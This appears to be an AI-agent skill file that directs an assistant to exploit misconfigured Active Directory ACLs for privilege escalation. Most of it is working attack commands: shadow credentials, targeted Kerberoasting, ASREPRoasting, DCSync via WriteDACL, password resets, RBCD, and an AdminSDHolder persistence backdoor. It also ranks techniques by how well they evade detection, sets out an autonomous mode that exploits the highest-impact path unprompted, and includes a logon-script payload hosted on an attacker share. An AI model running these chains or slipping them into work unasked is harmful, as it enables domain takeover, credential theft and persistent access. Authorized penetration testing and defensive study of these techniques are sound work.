---
name: acl-abuse
description: >
  Exploits misconfigured Active Directory ACLs for privilege escalation. Covers
  GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, targeted
  Kerberoasting via SPN manipulation, shadow credentials (msDS-KeyCredentialLink
  → PKINIT), and AdminSDHolder persistence. Use when BloodHound shows ACL-based
  attack paths or when you have write access to AD objects. Triggers on:
  "ACL abuse", "ACE abuse", "GenericAll", "GenericWrite", "WriteDACL",
  "WriteOwner", "ForceChangePassword", "shadow credentials", "msDS-KeyCredentialLink",
  "PKINIT", "pywhisker", "whisker", "AdminSDHolder", "SDProp", "targeted
  kerberoasting", "SPN manipulation", "dacledit", "AD permissions", "BloodHound
  attack path".
  OPSEC: medium (attribute modification logged as Event 5136; shadow credentials
  = low because no password change). Tools: bloodyAD, PowerView, pywhisker,
  Certipy, dacledit.py, Impacket.
  Do NOT use for Kerberoasting without ACL context — use **kerberos-roasting**.
  Do NOT use for delegation abuse — use **kerberos-delegation**.
---

# ACL/ACE Abuse

You are helping a penetration tester exploit misconfigured Active Directory
access control lists for privilege escalation. All testing is under explicit
written authorization.

**Kerberos-first authentication**: All commands default to Kerberos auth via
ccache. Use `-k -no-pass` (Impacket), `--use-kcache` (NetExec), `-k` (bloodyAD,
Certipy) throughout. Shadow credentials + PKINIT is natively Kerberos.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present it and wait for user approval. Explain each ACL right and
  what it enables. Present exploitation options ranked by OPSEC. Ask before
  modifying AD objects.
- **Autonomous**: Enumerate ACLs, identify the highest-impact path, exploit it.
  Clean up modified attributes. Pause before password resets (destructive).

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists:
- **Activity** -> `### [HH:MM] acl-abuse -> <target>` with ACL right exploited,
  technique used, access obtained.
- **Findings** -> Log confirmed ACL misconfigurations with escalation path.
- **Evidence** -> Save BloodHound paths to `engagement/evidence/acl-bloodhound.png`,
  credentials to `engagement/evidence/acl-creds.txt`.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[acl-abuse] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [HH:MM] acl-abuse → <target>
   - Invoked (assessment starting)
   ```

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Check for already-identified ACL paths (from BloodHound or discovery)
- Leverage existing credentials for ACL exploitation
- Avoid re-testing blocked paths

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Credentials**: Add recovered credentials/tickets from ACL abuse
- **Access**: Add escalated access obtained
- **Vulns**: Add ACL misconfigs as `GenericAll on X [found]`/`[done]`
- **Pivot Map**: Document ACL chain (e.g., WriteDACL on Domain -> DCSync)
- **Blocked**: Record failed ACL exploitation attempts

## Prerequisites

- Domain credentials (any level — ACL paths often start from low-priv users)
- Identified ACL misconfiguration (via BloodHound, PowerView, or bloodyAD)
- Tools: `bloodyAD`, `Impacket` suite, optionally `PowerView`, `pywhisker`,
  `Certipy`, `dacledit.py`, `Whisker.exe`

**Kerberos-first workflow**:
```bash
getTGT.py DOMAIN/user -hashes :NTHASH
# or with password
getTGT.py DOMAIN/user:'Password123!'
export KRB5CCNAME=user.ccache
# All subsequent commands use -k -no-pass or equivalent
```

## Step 1: Enumerate Exploitable ACLs

Skip if BloodHound or **ad-discovery** already identified the path.

### bloodyAD (Linux — Preferred)

```bash
# Find objects you can write to
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get writable \
  --otype USER --right WRITE --detail

bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get writable \
  --otype GROUP --right WRITE --detail

bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get writable \
  --otype COMPUTER --right WRITE --detail

# Check specific object
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get object targetuser \
  --attr nTSecurityDescriptor --resolve-sd
```

### PowerView (Windows)

```powershell
# Scan for exploitable ACLs
Invoke-ACLScanner -ResolveGUIDs | Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights

# Check specific object
Get-ObjectAcl -SamAccountName targetuser -ResolveGUIDs | ? {
  $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword"
}
```

### BloodHound Queries

```cypher
# Shortest path from owned to Domain Admins via ACL edges
MATCH p=shortestPath((n {owned:true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|Owns*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p

# All ACL edges from a specific user
MATCH p=(n:User {name:'USER@DOMAIN.LOCAL'})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword]->(m) RETURN p
```

### Decision Tree

| ACL Right | Target Type | Go To |
|-----------|-------------|-------|
| GenericAll | User | Step 2 (choose: shadow creds, SPN abuse, password reset) |
| GenericAll | Group | Step 3 (add yourself to group) |
| GenericAll | Computer | Step 7 (RBCD setup → **kerberos-delegation**) |
| GenericWrite | User | Step 2 (shadow creds, SPN abuse, logon script) |
| GenericWrite | Computer | Step 7 (RBCD) |
| WriteDACL | Domain object | Step 4 (grant DCSync rights) |
| WriteDACL | Group/User | Step 4 (grant GenericAll, then escalate) |
| WriteOwner | Any | Step 5 (take ownership, then WriteDACL) |
| ForceChangePassword | User | Step 6 (reset password — destructive) |

## Step 2: GenericAll / GenericWrite on User

You have full control or write access to a user object. Multiple techniques
available — choose by OPSEC preference.

### Option A: Shadow Credentials (Lowest OPSEC — Preferred)

Add a key credential to the target's `msDS-KeyCredentialLink` attribute, then
authenticate via PKINIT. No password change, pure Kerberos.

**Requirements**: DC is Windows Server 2016+, AD CS configured, PKINIT enabled.

```bash
# pywhisker — add shadow credential
pywhisker.py -d DOMAIN.LOCAL -u attacker -k --no-pass \
  --target targetuser --action add --filename targetuser_cert
# Output: PFX file path + password + DeviceID (save for cleanup)

# Alternative: bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL \
  add shadowCredentials targetuser
# Output: PFX file + password

# Alternative: Certipy (full automation — adds cred + gets TGT)
certipy shadow auto -account targetuser -dc-ip DC_IP -k -no-pass \
  -target DC.DOMAIN.LOCAL
```

**Authenticate with the PFX (PKINIT)**:
```bash
# Get TGT via PKINIT
gettgtpkinit.py DOMAIN.LOCAL/targetuser targetuser.ccache \
  -cert-pfx targetuser_cert.pfx -pfx-pass 'PFX_PASSWORD'

# Or with Certipy
certipy auth -pfx targetuser_cert.pfx -dc-ip DC_IP

# Use the TGT
export KRB5CCNAME=targetuser.ccache
secretsdump.py -k -no-pass DOMAIN/targetuser@DC.DOMAIN.LOCAL
```

**If target is a computer account — S4U2Self for impersonation**:
```bash
# Get TGT for the computer
gettgtpkinit.py DOMAIN.LOCAL/TARGET\$ target.ccache \
  -cert-pfx target_cert.pfx -pfx-pass 'PFX_PASSWORD'

# S4U2Self to impersonate Administrator
export KRB5CCNAME=target.ccache
gets4uticket.py kerberos+ccache://DOMAIN.LOCAL\\TARGET\$:target.ccache@DC.DOMAIN.LOCAL \
  cifs/TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL Administrator@DOMAIN.LOCAL admin.ccache

export KRB5CCNAME=admin.ccache
wmiexec.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
```

**Cleanup (critical)**:
```bash
pywhisker.py -d DOMAIN.LOCAL -u attacker -k --no-pass \
  --target targetuser --action remove --device-id DEVICE_ID

# Or bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL \
  remove shadowCredentials targetuser --key KEY_ID

# Verify removal
pywhisker.py -d DOMAIN.LOCAL -u attacker -k --no-pass \
  --target targetuser --action list
```

### Option B: Targeted Kerberoasting (SPN Manipulation)

Set an SPN on the target user, request a TGS, crack it offline, remove the SPN.

```bash
# Check current SPNs (should be empty for regular users)
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get object targetuser \
  --attr serviceprincipalname

# Set SPN
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set object targetuser \
  serviceprincipalname -v 'ops/whatever1'

# Extract TGS
GetUserSPNs.py DOMAIN/attacker -k -no-pass -request-user targetuser

# Crack (hashcat mode 13100 for RC4, 19700 for AES)
hashcat -m 13100 tgs_hash.txt wordlist.txt

# Remove SPN immediately (cleanup)
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set object targetuser \
  serviceprincipalname
```

```powershell
# PowerView (Windows)
Set-DomainObject targetuser -Set @{serviceprincipalname='ops/whatever1'}
Get-DomainUser targetuser | Get-DomainSPNTicket | fl
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

**OPSEC**: Medium — SPN creation logged as Event 5136. Cracking is offline.
Remove SPN immediately after TGS extraction.

### Option C: ASREPRoasting (Disable Pre-Auth)

```bash
# Disable Kerberos pre-authentication
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add uac targetuser \
  -f DONT_REQ_PREAUTH

# Get AS-REP hash
GetNPUsers.py DOMAIN/targetuser -format hashcat -outputfile asrep.txt -k -no-pass

# Crack
hashcat -m 18200 asrep.txt wordlist.txt

# Restore pre-auth (cleanup)
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove uac targetuser \
  -f DONT_REQ_PREAUTH
```

**OPSEC**: Medium — UAC change logged as Event 5136. Disabled pre-auth is
unusual and may trigger alerts.

### Option D: Logon Script Path

```bash
# Set logon script (executes at user's next logon)
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set object targetuser \
  scriptpath -v '\\ATTACKER_IP\share\payload.bat'

# Cleanup
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set object targetuser \
  scriptpath -v ''
```

**OPSEC**: Medium-High — requires user logon, script path visible in AD.

## Step 3: GenericAll / GenericWrite on Group

Add yourself (or a controlled user) to a privileged group.

```bash
# bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add groupMember \
  'Domain Admins' attacker

# Verify
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get groupMember \
  'Domain Admins'

# Cleanup
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove groupMember \
  'Domain Admins' attacker
```

```powershell
# PowerView
Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker
Get-DomainGroupMember -Identity 'Domain Admins'
Remove-DomainGroupMember -Identity 'Domain Admins' -Members attacker
```

**OPSEC**: **High** — Group membership changes logged as Event 4728/4732/4756.
Domain Admins modifications generate immediate alerts. Consider targeting
less-monitored groups that still provide the access you need.

## Step 4: WriteDACL

Grant yourself additional permissions on the target object.

### WriteDACL on Domain Object → DCSync

```bash
# Grant DCSync rights (Replicating Directory Changes + All)
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add dcsync attacker

# Or with dacledit.py
dacledit.py -action write -rights DCSync -principal attacker \
  -target-dn 'DC=DOMAIN,DC=LOCAL' DOMAIN/attacker -k -no-pass

# Perform DCSync
secretsdump.py -k -no-pass DOMAIN/attacker@DC.DOMAIN.LOCAL -just-dc

# Cleanup — remove DCSync rights
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove dcsync attacker
```

### WriteDACL on Group/User → GenericAll

```bash
# Grant GenericAll on group
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add genericAll \
  'CN=Domain Admins,CN=Users,DC=DOMAIN,DC=LOCAL' attacker

# Now you have GenericAll — proceed to Step 3 (group) or Step 2 (user)

# Cleanup
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove genericAll \
  'CN=Domain Admins,CN=Users,DC=DOMAIN,DC=LOCAL' attacker
```

```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -Rights All \
  -PrincipalIdentity attacker -Verbose
```

### WriteDACL on OU → Inheritance

```bash
# Grant FullControl on OU with inheritance (propagates to all children)
dacledit.py -action write -rights FullControl -inheritance \
  -principal attacker -target-dn 'OU=SERVERS,DC=DOMAIN,DC=LOCAL' \
  DOMAIN/attacker -k -no-pass
```

**Note**: Objects with `adminCount=1` do NOT inherit from parent OUs
(AdminSDHolder protection).

**OPSEC**: High — ACL changes logged as Event 5136, Event 4662 for directory
access. DCSync triggers Event 4662 with replication GUIDs.

## Step 5: WriteOwner

Take ownership of an object, then modify its DACL.

```bash
# Step 1: Change owner to yourself
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set owner targetobject attacker

# Step 2: As owner, grant yourself GenericAll
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add genericAll \
  targetobject attacker

# Step 3: Exploit (password reset, shadow creds, group add, etc.)
# ... use techniques from Step 2 or Step 3

# Cleanup: restore original owner and remove ACL
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove genericAll \
  targetobject attacker
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set owner \
  targetobject original_owner
```

```powershell
# PowerView
Set-DomainObjectOwner -Identity targetobject -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity targetobject -Rights All \
  -PrincipalIdentity attacker
```

**OPSEC**: Medium — Owner change logged as Event 4670. Two-step attack
creates an audit trail.

## Step 6: ForceChangePassword

Reset a user's password without knowing the current one. **Destructive** —
the user will be locked out of their account.

```bash
# bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set password targetuser \
  'NewP@ssw0rd!'

# rpcclient
rpcclient -U 'attacker%password' DC_IP \
  -c "setuserinfo2 targetuser 23 'NewP@ssw0rd!'"
```

```powershell
# PowerView
Set-DomainUserPassword -Identity targetuser \
  -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)
```

**OPSEC**: **High** — Password reset logged as Event 4724. User loses access.
Triggers MFA re-enrollment, conditional access, and help desk tickets.
**Use shadow credentials (Step 2 Option A) instead whenever possible.**

## Step 7: GenericAll/GenericWrite on Computer → RBCD

If you have write access to a computer object, set up Resource-Based
Constrained Delegation.

```bash
# Create attacker computer account (if needed)
addcomputer.py -computer-name 'FAKECOMP$' -computer-pass 'P@ssw0rd!' \
  DOMAIN/attacker -k -no-pass

# Set RBCD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add rbcd 'TARGET$' 'FAKECOMP$'

# S4U attack — see kerberos-delegation skill for full chain
getST.py -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator \
  DOMAIN/'FAKECOMP$':'P@ssw0rd!'

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL

# Cleanup
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove rbcd 'TARGET$' 'FAKECOMP$'
```

Route to **kerberos-delegation** (Step 4) for the full RBCD exploitation chain.

## Step 8: AdminSDHolder Persistence

**Concept**: AdminSDHolder is a template object. SDProp runs every 60 minutes
and copies AdminSDHolder's DACL to all objects with `adminCount=1` (Domain
Admins, Enterprise Admins, etc.). Backdoor AdminSDHolder → your ACE propagates
to all privileged accounts.

**Requires**: Existing Domain Admin access (persistence technique, not escalation).

```bash
# Add GenericAll for attacker on AdminSDHolder
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add genericAll \
  'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' attacker

# Wait for SDProp (60 minutes by default) or force it:
# On DC as admin:
Invoke-ADSDPropagation  # PowerShell
# or
ldifde -i -f sdprop.ldf  # LDAP modification to trigger SDProp

# After propagation: attacker has GenericAll on all adminCount=1 objects
# This persists across password changes, group modifications, etc.

# Cleanup
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove genericAll \
  'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' attacker
# Note: cleanup won't propagate until next SDProp cycle
```

**OPSEC**: Medium — AdminSDHolder ACL changes are rarely monitored but highly
suspicious if found during forensics. SDProp propagation is normal AD behavior.

## Step 9: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

After successful ACL abuse:
- **Obtained user credentials**: Route to **pass-the-hash** for lateral movement
- **DCSync achieved**: Route to **kerberos-ticket-forging** for Golden/Diamond
  Ticket persistence
- **Group membership gained**: Exploit new privileges (file shares, GPO, etc.)
- **RBCD configured**: Route to **kerberos-delegation** Step 4
- **Shadow credentials on computer**: Route to **kerberos-delegation** for S4U
- **Need ADCS abuse**: Route to **adcs-template-abuse** or **adcs-access-and-relay**
- **Found more ACL paths in BloodHound**: Continue enumeration in Step 1

When routing, pass: credentials/tickets obtained, escalation path used, cleanup
status, and current mode.

Update `engagement/state.md` with ACL findings, obtained access, and cleanup notes.

## Troubleshooting

### Shadow Credentials: "Key credential not supported"

DC must be Windows Server 2016+ with AD CS and PKINIT configured. Check:
```bash
certipy find -dc-ip DC_IP -k -no-pass -stdout | grep "Certificate Authority"
```
If no CA exists, fall back to targeted Kerberoasting (Option B).

### Shadow Credentials: PKINIT Auth Fails

- Ensure the PFX password matches what was output during creation
- Verify the DC has an enrollment agent certificate
- Check that PKINIT is enabled in domain policies
- Try `certipy shadow auto` for automated handling

### ForceChangePassword: "Access Denied"

- The ExtendedRight for password reset may not be inherited. Check the specific
  ACE on the target object, not just the OU.
- Some accounts have explicit deny ACEs that override inherited allow.

### WriteDACL Succeeds But Exploitation Fails

- ACL changes may take time to replicate across DCs (AD replication lag)
- Target the same DC for both ACL modification and exploitation
- Verify with `get object --attr nTSecurityDescriptor` after modification

### bloodyAD: "Unable to connect"

- Ensure `-k` flag is present for Kerberos auth
- Verify `KRB5CCNAME` points to a valid ccache
- Try `--host DC_FQDN` (not IP) for Kerberos name resolution

### OPSEC Comparison

| Technique | OPSEC | Event IDs | Destructive |
|-----------|-------|-----------|-------------|
| Shadow Credentials | **LOW** | 5136 (attr change) | No |
| Targeted Kerberoasting | **MEDIUM** | 5136 (SPN), 4769 (TGS) | No |
| ASREPRoast (UAC change) | **MEDIUM** | 5136 (UAC) | No |
| WriteDACL → DCSync | **HIGH** | 5136, 4662 | No |
| Group Membership Add | **HIGH** | 4728/4732/4756 | No |
| Password Reset | **HIGH** | 4724 | **Yes** |
| AdminSDHolder Backdoor | **MEDIUM** | 5136 | No (persistence) |
